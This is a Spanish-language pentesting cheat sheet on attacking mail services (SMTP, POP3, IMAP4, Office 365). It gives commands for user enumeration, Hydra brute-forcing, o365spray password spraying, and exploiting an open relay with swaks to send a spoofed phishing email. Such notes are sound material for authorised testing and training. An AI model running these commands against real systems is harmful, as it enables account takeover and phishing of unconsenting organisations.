---
tags:
---
# SMTP / POP3 / IMAP4

Los protocolos de correo electrónico son un vector habitual en pentesting: permiten enumerar usuarios válidos, realizar password spraying y, en casos de mala configuración, enviar correos suplantando identidades (open relay).

---

## Puertos

| Puerto | Protocolo | Cifrado |
|---|---|---|
| 25/TCP | SMTP | No |
| 465/TCP | SMTP | Sí (SSL) |
| 587/TCP | SMTP | STARTTLS |
| 110/TCP | POP3 | No |
| 995/TCP | POP3 | Sí |
| 143/TCP | IMAP4 | No |
| 993/TCP | IMAP4 | Sí |

---

## Reconocimiento — Registros MX

```bash
# Con host
host -t MX ejemplo.com

# Con dig
dig mx ejemplo.com | grep "MX" | grep -v ";"

# Resolver IP del servidor de correo
host -t A mail.ejemplo.com
```

---

## Enumeración de usuarios SMTP

El protocolo SMTP expone comandos que, si no están deshabilitados, permiten verificar si un usuario existe en el servidor.

### VRFY — verificar usuario

```bash
telnet <IP> 25

VRFY root
# 252 2.0.0 root   → usuario existe
# 550 5.1.1 ...    → usuario no existe
```

### EXPN — expandir lista de distribución

```bash
EXPN soporte
# 250 carol@empresa.com
# 250 jose@empresa.com
```

### RCPT TO — enumerar destinatarios

```bash
MAIL FROM:test@test.com
RCPT TO:admin
# 250 → existe
# 550 → no existe
```

### smtp-user-enum (automatizado)

```bash
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -D empresa.com -t <IP>
```

---

## Enumeración de usuarios POP3

```bash
telnet <IP> 110

USER john
# +OK → usuario existe
# -ERR → no existe
```

---

## Ataques de contraseña

### Hydra contra POP3

```bash
hydra -L usuarios.txt -p 'Password123' -f <IP> pop3
```

### Hydra contra SMTP

```bash
hydra -L usuarios.txt -P passwords.txt <IP> smtp -t 4
```

---

## Office 365 — enumeración y password spray

### O365Spray

```bash
git clone https://github.com/0xZDH/o365spray
cd o365spray && pip3 install -r requirements.txt

# Validar si el dominio usa O365
python3 o365spray.py --validate --domain empresa.com

# Enumerar usuarios
python3 o365spray.py --enum -U usuarios.txt --domain empresa.com

# Password spray
python3 o365spray.py --spray -U usuarios_validos.txt \
  -p 'Marzo2024!' --count 1 --lockout 1 --domain empresa.com
```

> ⚠️ Usar `--lockout 1` (esperar 1 minuto entre rondas) para no bloquear cuentas.

---

## Open Relay

Un servidor SMTP configurado como open relay acepta y retransmite correo de cualquier origen. Permite enviar correos suplantando remitentes legítimos.

### Detectar con Nmap

```bash
nmap -p25 -Pn --script smtp-open-relay <IP>
# "Server is an open relay (14/16 tests)" → vulnerable
```

### Explotar con swaks

```bash
swaks --from notificaciones@empresa.com \
      --to empleados@empresa.com \
      --header 'Subject: Aviso de seguridad' \
      --body 'Por favor accede a: http://phishing.com/' \
      --server <IP>
```



